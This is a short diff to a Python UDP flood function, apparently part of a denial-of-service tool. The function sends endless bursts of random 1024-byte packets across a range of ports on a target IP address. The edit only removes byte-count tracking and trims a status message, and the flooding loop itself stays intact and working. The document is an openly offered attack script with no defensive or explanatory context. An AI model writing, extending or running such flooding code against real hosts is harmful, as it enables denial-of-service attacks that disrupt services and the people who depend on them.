@@ -12,18 +12,17 @@ def udp_flood(ip, port_range, verbose = False):
     end = int(port_range[1])
 
     j = 1
-    total_sent = 0
     pkt_length = 1024
     while 1:
         try:
             pkt = _urandom(pkt_length)
+
             [S.sendto(pkt,(ip,start)) for start in range(start,end)]
-            total_sent = total_sent + pkt_length
-            if verbose: print('Flooded ports %d - %d, %d times\n %d KB' % (start, end, j, to_KB(total_sent))) 
+
+            if verbose: print('Flooded ports %d - %d, %d times' % (start, end, j)) 
             else: continue
             j += 1 
         except KeyboardInterrupt:
-            print(to_KB(total_sent), 'KB')
             exit()
 
     return
